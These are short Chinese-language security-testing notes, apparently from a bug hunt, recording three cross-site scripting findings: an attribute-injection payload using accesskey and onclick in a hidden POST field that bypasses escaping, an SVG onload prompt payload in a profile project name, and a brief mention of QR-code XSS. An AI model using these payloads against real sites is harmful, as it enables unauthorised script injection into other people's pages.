1.隐藏输入中的xss（绕过输入转义）
参数，位于post请求中的listViewHeading=
有效负载：" accesskey=X onclick=alert()
![[Pasted image 20241014211401.png]]
" accesskey=X onclick=alert() xxx
![[Pasted image 20241014211445.png]]
success

2.个人主页的项目名称中可以插入xsspayload
```
post
name="><svg onload="prompt(/xss/);"><!--
```

3.二维码xss
二维码执行js
